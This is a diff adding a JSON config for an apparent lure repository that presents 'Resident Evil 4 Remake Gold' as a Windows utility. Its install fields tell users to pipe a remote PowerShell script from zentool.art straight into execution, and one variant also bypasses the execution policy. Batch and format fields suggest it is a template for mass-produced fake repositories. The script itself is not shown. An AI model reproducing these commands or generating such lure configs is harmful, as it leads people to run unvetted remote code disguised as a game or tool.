@@ -1,0 +1,28 @@
+{
+  "repo": "Resident-Evil-4-Remake-Gold",
+  "product": "Resident Evil 4 Remake Gold",
+  "product_title": "Resident Evil 4 Remake Gold",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-zentool-moltora-pending",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "resident-evil-4-remake-gold-windows",
+    "resident-config",
+    "resident-integration",
+    "resident-latest",
+    "system-tools",
+    "windows-utility",
+    "desktop-tools",
+    "maintenance",
+    "configuration",
+    "performance-tuning",
+    "disk-cleanup",
+    "uninstaller"
+  ],
+  "site": "zentool.art"
+}
